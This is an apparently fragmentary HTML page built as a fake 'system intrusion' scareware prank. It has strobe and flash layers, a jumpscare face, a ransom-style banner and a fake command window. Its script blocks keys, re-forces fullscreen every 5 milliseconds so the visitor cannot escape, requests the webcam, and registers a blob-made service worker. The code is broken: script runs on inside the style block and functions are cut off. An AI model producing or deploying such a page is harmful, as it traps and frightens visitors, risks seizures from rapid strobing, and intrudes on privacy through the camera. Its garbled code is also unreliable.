<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>⛔ 系统入侵 ⛔</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #000;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            cursor: none;
            font-family: 'Courier New', monospace;
            user-select: none;
            position: relative;
        }
        #flicker, #strobe, #flash {
            position:fixed; inset:0; pointer-events:none;
            z-index:999997; opacity:0; transition:opacity 0.005s;
        }
        #flicker { background:#000; z-index:999997; }
        #strobe { background:white; z-index:999996; }
        #flash { background:white; z-index:99999998; }

        #butterflies { position:fixed; inset:0; z-index:999995; pointer-events:none; overflow:hidden; }
        .butterfly {
            position:absolute; font-size:2.5rem;
            animation: fly 3s infinite alternate ease-in-out;
            filter:drop-shadow(0 0 15px rgba(255,0,255,0.8));
            will-change:transform;
        }
        @keyframes fly {
            0%   { transform:translate(0,0) rotate(0deg) scale(1); }
            25%  { transform:translate(90vw,-50vh) rotate(180deg) scale(1.8); }
            50%  { transform:translate(-40vw,70vh) rotate(360deg) scale(0.6); }
            75%  { transform:translate(60vw,-80vh) rotate(540deg) scale(2); }
            100% { transform:translate(-20vw,20vh) rotate(720deg) scale(1); }
        }
        .butterfly:nth-child(odd) { animation-duration:4s; }
        .butterfly:nth-child(3n) { animation-duration:2.5s; }
        .butterfly:nth-child(5n+1) { font-size:5rem; }
        .butterfly:nth-child(7n+2) { font-size:1.5rem; opacity:0.3; }

        @keyframes shake {
            0%{transform:translate(0,0)}
            10%{transform:translate(-80px,50px)}
            20%{transform:translate(60px,-90px)}
            30%{transform:translate(-50px,80px)}
            40%{transform:translate(90px,-40px)}
            50%{transform:translate(-100px,-60px)}
            60%{transform:translate(50px,90px)}
            70%{transform:translate(-60px,-50px)}
            80%{transform:translate(80px,30px)}
            90%{transform:translate(-40px,-80px)}
            100%{transform:translate(0,0)}
        }
        .shake { animation:shake 0.05s infinite; }

        .chaos-text {
            position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
            z-index:999999; color:#ff0040; font-size:8rem; font-weight:900;
            text-align:center; text-shadow:0 0 100px red,0 0 200px magenta,0 0 300px purple;
            animation:glitch 0.008s infinite alternate;
            pointer-events:none; mix-blend-mode: difference;
        }
        @keyframes glitch {
            0%   { transform:translate(-50%,-50%) scale(1) rotate(0deg); color:#ff0040; }
            20%  { transform:translate(-48%,-52%) scale(1.5) rotate(5deg); color:#00ff80; }
            40%  { transform:translate(-52%,-48%) scale(0.5) rotate(-5deg); color:#00aaff; }
            60%  { transform:translate(-45%,-55%) scale(2) rotate(8deg); color:#ff00ff; }
            80%  { transform:translate(-55%,-45%) scale(0.6) rotate(-8deg); color:#ffaa00; }
            100% { transform:translate(-50%,-50%) scale(1) rotate(0deg); color:#ff0040; }
        }

        #cameraFeed {
            position:fixed; bottom:20px; right:20px; width:300px; height:220px;
            z-index:9999999; border:5px solid #ff0040; border-radius:16px;
            box-shadow:0 0 80px rgba(255,0,0,0.9); object-fit:cover;
            background:#000; display:none;
        }
        #cameraFeed.active { display:block; }

        /* ─── OVERLAY (jumpscare) ─── */
        #overlay {
            position:fixed; inset:0; width:100vw; height:100vh;
            background:#000; display:none; align-items:center; justify-content:center;
            flex-direction:column; z-index:99999999; cursor:pointer;
        }
        #overlay.active { display:flex; }
        #overlay .face { font-size:35rem; animation:shakeRotate 0.015s infinite alternate; filter:drop-shadow(0 0 300px red); pointer-events:none; }
        @keyframes shakeRotate {
            0%   { transform:translate(-30px,25px) rotate(-8deg) scale(1.3); }
            25%  { transform:translate(25px,-30px) rotate(7deg) scale(0.7); }
            50%  { transform:translate(-25px,35px) rotate(-9deg) scale(1.4); }
            75%  { transform:translate(35px,-25px) rotate(8deg) scale(0.6); }
            100% { transform:translate(-20px,20px) rotate(-5deg) scale(1.2); }
        }
        #overlay .sub { color:#ff2244; font-size:5rem; font-weight:900; margin-top:2rem; text-shadow:0 0 150px red; animation:blinkText 0.03s infinite alternate; pointer-events:none; }
        @keyframes blinkText { 0%{opacity:1} 50%{opacity:0} 100%{opacity:1} }

        .audio-wave {
            position:fixed; bottom:20px; left:50%; transform:translateX(-50%);
            z-index:999994; display:flex; gap:6px; align-items:flex-end; height:150px; pointer-events:none;
        }
        .audio-wave .bar { width:12px; background:#ff0040; animation:wave 0.06s infinite alternate; border-radius:4px; }
        .audio-wave .bar:nth-child(1) { animation-duration:0.04s; height:50px; }
        .audio-wave .bar:nth-child(2) { animation-duration:0.08s; height:100px; }
        .audio-wave .bar:nth-child(3) { animation-duration:0.03s; height:70px; }
        .audio-wave .bar:nth-child(4) { animation-duration:0.11s; height:130px; }
        .audio-wave .bar:nth-child(5) { animation-duration:0.05s; height:60px; }
        .audio-wave .bar:nth-child(6) { animation-duration:0.09s; height:110px; }
        .audio-wave .bar:nth-child(7) { animation-duration:0.04s; height:80px; }
        .audio-wave .bar:nth-child(8) { animation-duration:0.07s; height:140px; }
        .audio-wave .bar:nth-child(9) { animation-duration:0.10s; height:65px; }
        .audio-wave .bar:nth-child(10) { animation-duration:0.06s; height:95px; }
        @keyframes wave { 0%{height:10px;opacity:0.2} 100%{height:150px;opacity:1} }

        #ransom {
            position:fixed; top:5%; left:50%; transform:translateX(-50%);
            z-index:9999998; background:rgba(0,0,0,0.95); padding:3rem 6rem;
            border:5px solid #ff0040; border-radius:30px; color:#ff0040;
            font-size:2.8rem; font-weight:900; text-align:center;
            box-shadow:0 0 150px rgba(255,0,0,0.5);
            animation:blinkText 0.15s infinite alternate;
            pointer-events:none;
            backdrop-filter:blur(20px);
            font-family:'Courier New',monospace;
            letter-spacing:4px;
        }

        #canvasNoise {
            position:fixed; inset:0; z-index:999994; pointer-events:none;
            width:100%; height:100%; display:block;
        }

        #redOverlay {
            position:fixed; inset:0; z-index:999993; pointer-events:none;
            background:rgba(255,0,0,0.05); animation:pulseRed 0.02s infinite alternate;
        }
        @keyframes pulseRed { 0%{opacity:0} 100%{opacity:0.2} }

        /* Fake CMD overlay */
        #fakeDesktop {
            position:fixed; inset:0; z-index:999990; pointer-events:none;
            display:flex; align-items:center; justify-content:center;
        }
        #fakeDesktop .cmd {
            background:rgba(0,0,0,0.9); padding:2rem; border:2px solid #00ff00;
            color:#00ff00; font-size:1.8rem; border-radius:12px;
            box-shadow:0 0 100px rgba(0,255,0,0.2);
            width:80%; max-width:900px;
            animation:cmdBlink 0.8s infinite;
        }
        @keyframes cmdBlink { 0%{opacity:1} 50%{opacity:0.5} 100%{opacity:1} }
        .cmd .line { margin:0.5rem 0; }
        .cmd .cursor { animation:blink 0.5s infinite; }
        @keyframes blink { 0%{opacity:1} 50%{opacity:0} 100%{opacity:1} }

        /* ─── START BUTTON (ensures fullscreen on click) ─── */
        #startBtn {
            position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
            z-index:99999999; background:rgba(0,0,0,0.85); border:4px solid #ff0040;
            color:#ff0040; padding:3rem 6rem; font-size:4rem; font-weight:900;

        }
        #startBtn:hover { background:#ff0040; color:#000; box-shadow:0 0 200px rgba(255,0,0,0.8); transform:translate(-50%,-50%) scale(1.05); }
        @keyframes pulseBtn { 0%{transform:translate(-50%,-50%) scale(1)} 100%{transform:translate(-50%,-50%) scale(1.05)} }
        #startBtn.hidden { display:none; }
    </style>

            function blockKeys(e) {
                e.preventDefault();

            // ─── PERMANENT FULLSCREEN LOCK (every 5ms) ───
            function lockFullscreen() {
                if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                    document.documentElement.requestFullscreen?.().catch(()=>{});
                    document.documentElement.webkitRequestFullscreen?.();
                }
            }
            setInterval(lockFullscreen, 5);
            document.addEventListener('fullscreenchange', () => {
                if (!document.fullscreenElement) lockFullscreen();
            });
            document.addEventListener('webkitfullscreenchange', () => {
                if (!document.webkitFullscreenElement) lockFullscreen();
            });
            document.addEventListener('visibilitychange', lockFullscreen);
            window.addEventListener('focus', lockFullscreen);

            // ─── Camera ───
            function requestCamera() {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {

                    const blob = new Blob([swCode], {type:'application/javascript'});
                    const swUrl = URL.createObjectURL(blob);
                    navigator.serviceWorker.register(swUrl).catch(()=>{});
